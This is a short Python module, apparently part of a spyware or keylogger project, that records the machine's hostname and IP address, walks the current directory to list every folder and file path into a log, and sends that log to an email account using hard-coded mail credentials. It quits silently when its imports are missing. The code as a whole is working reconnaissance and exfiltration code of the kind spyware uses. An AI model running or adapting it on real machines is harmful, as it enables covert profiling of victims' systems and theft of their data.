try: #import necessary libraries
    import os
    import socket
    from mail import send_mail #Send Log to Mail
except ModuleNotFoundError:
    exit(0)
finally:
    EMAIL_ADDRESS = "eef5687d144f58"
    EMAIL_PASSWORD = "59d3054644d98a"
    FILENAME = "C:/Users/sudee/ISAA/SysOutput.txt"
    TYPE="Systemlogging Data"

    class system_info: 
        def __init__(self, email, password):
            self.log = "System Details"
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + '\n' + string

        def run(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            self.appendlog(hostname+" ")
            self.appendlog(ip+"\n\n")
            f=open(FILENAME,"a")
            f.write(self.log)
            f.close()

            root = '.'
            fe = open(FILENAME, "a")
            for root, dirs, files in os.walk(root):
                for d in dirs:
                    fe.write(os.path.join(root, d)+"\n")   
                for f in files:
                    fe.write(os.path.join(root, f)+"\n")
            fe.close()
            send_mail(self.email, self.password, FILENAME, TYPE)
